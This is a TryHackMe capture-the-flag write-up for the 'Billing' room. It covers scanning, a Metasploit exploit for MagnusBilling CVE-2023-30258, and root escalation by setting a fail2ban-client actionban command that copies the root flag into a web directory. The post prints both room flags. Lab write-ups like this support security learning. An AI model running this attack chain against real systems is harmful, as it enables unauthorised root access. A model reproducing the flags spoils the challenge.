---
title: "TryHackMe - Billing"
date: 2025-03-08 12:00:00 +0000
author: scr4tcher
categories: [TryHackMe CTF]
tags: [nmap, metasploit, privilege escalation, fail2ban]

---


## Introduction

In this post, I will describe my approach to solving the MagnusBilling CTF challenge on TryHackMe. The process involved port scanning, service enumeration, exploiting the known vulnerability CVE-2023-30258, and escalating privileges to root using Fail2Ban manipulation.

## 1. Port Scanning

First, I scanned the target host to identify available ports and services:
```console
nmap -sC -sV -Pn 10.10.181.229
```
## 2. Directory Enumeration

I used Gobuster to identify potentially interesting directories:
```console
gobuster dir -u http://10.10.181.229 -w /usr/share/wordlists/dirb/big.txt
```
I checked `robots.txt` and discovered mbilling directory.<br>
After finding the mbilling directory, I performed a more detailed scan:
```console
gobuster dir -u http://10.10.181.229/mbilling -w /usr/share/wordlists/dirb/big.txt
```

## 3. Exploiting MagnusBilling Vulnerability (CVE-2023-30258)

After researching 
 [CVE-2024-30258 Exploit](https://www.rapid7.com/db/modules/exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258/)
 I used Metasploit to gain access to the system:
```console
msf > use exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258
msf exploit(magnusbilling_unauth_rce_cve_2023_30258) > show targets
msf exploit(magnusbilling_unauth_rce_cve_2023_30258) > set TARGET <target-id>
msf exploit(magnusbilling_unauth_rce_cve_2023_30258) > show options
msf exploit(magnusbilling_unauth_rce_cve_2023_30258) > exploit
```
After gaining access, I found the first flag in the `magnus` user's directory:

`THM{4a6831d5f124b25eefb1e92e0f0da4ca}`

 ## 4. Privilege Escalation to Root via Fail2Ban

I checked which commands I could run as sudo:

```console
sudo -l
```
The output showed:
```
User asterisk may run the following commands on Billing:
    (ALL) NOPASSWD: /usr/bin/fail2ban-client

I found a way to escalate privileges through Fail2Ban:

Source: juggernaut-sec.com

I modified the Fail2Ban rule to copy the root flag to a directory accessible by the www-data user:

sudo /usr/bin/fail2ban-client set sshd action iptables-multiport actionban "/bin/bash -c 'cat /root/root.txt > /var/www/html/mbilling/lib/icepay/root_exposed.txt && chmod 777 /var/www/html/mbilling/lib/icepay/root_exposed.txt'"
```


I’m researching [Fail2Ban](https://juggernaut-sec.com/fail2ban-lpe/).It turns out that I have sudo privileges that allow me to restart the Fail2Ban service without knowing the current user's password. This enables me to exploit it to execute arbitrary commands. To achieve this, I need to modify the iptables-multiport actionban file so that it allows me to read the next flag, which is accessible only by root.

```bash
sudo /usr/bin/fail2ban-client set sshd action iptables-multiport actionban "/bin/bash -c 'cat /root/root.txt > /var/www/html/mbilling/lib/icepay/root_exposed.txt && chmod 777 /var/www/html/mbilling/lib/icepay/root_exposed.txt'"

```

To execute the malicious command, I also need to ban the local IP:

```bash
sudo /usr/bin/fail2ban-client set sshd banip 127.0.0.1

```

Now I can read the flag:

```bash
cat /var/www/html/mbilling/lib/icepay/root_exposed.txt

```
Flag : `THM{33ad5b530e71a172648f424ec23fae60}`


## Conclusion

In this challenge, I demonstrated a complete attack chain, from initial reconnaissance to privilege escalation. By systematically scanning the target, identifying vulnerabilities, and leveraging misconfigurations, I was able to gain root access. 